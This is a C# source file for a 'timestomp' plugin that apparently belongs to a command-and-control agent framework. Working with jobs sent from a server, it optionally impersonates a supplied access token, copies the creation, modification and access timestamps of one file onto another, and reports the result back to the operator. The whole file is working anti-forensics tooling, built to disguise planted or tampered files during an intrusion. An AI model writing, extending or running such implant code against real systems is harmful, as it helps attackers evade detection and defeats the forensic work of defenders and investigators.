using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;
using System.Text.Json;

namespace timestomp
{
    public class TimeStomp : IPlugin
    {
        public string Name => "timestomp";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public TimeStomp(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
            StringBuilder sb = new StringBuilder();

            if(args is null || string.IsNullOrEmpty(args.source) || string.IsNullOrEmpty(args.destination)) {
                await messageManager.Write("Missing Arguments.", job.task.id, true, "error");
                return;
            }

            string sourceFile = args.source;
            string destFile = args.destination;

            DateTime ct;
            DateTime lwt;
            DateTime lat;

            if (File.Exists(sourceFile))
            {
                if (File.Exists(destFile))
                {
                    try
                    {
                        ct = File.GetCreationTime(sourceFile);
                        lwt = File.GetLastWriteTime(sourceFile);
                        lat = File.GetLastAccessTime(sourceFile);

                        File.SetCreationTime(destFile, ct);
                        File.SetLastWriteTime(destFile, lwt);
                        File.SetLastAccessTime(destFile, lat);

                        sb.AppendFormat("Time attributes applied to {0}:", destFile).AppendLine();
                        sb.AppendFormat("\tCreation Time: {0}", ct).AppendLine();
                        sb.AppendFormat("\tLast Write Time: {0}", lwt).AppendLine();
                        sb.AppendFormat("\tLast Access Time: {0}", lat).AppendLine();
                    }
                    catch (Exception e)
                    {
                        sb.AppendFormat("Could not timestomp {0}: {1}", destFile, e.ToString()).AppendLine();
                    }
                }
                else
                {
                    sb.AppendFormat("{0} does not exist! Check your path", destFile).AppendLine();
                }
            }
            else
            {
                sb.AppendFormat("{0} does not exist! Check your path", sourceFile).AppendLine();
            }
            await messageManager.Write(sb.ToString(), job.task.id, true);
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}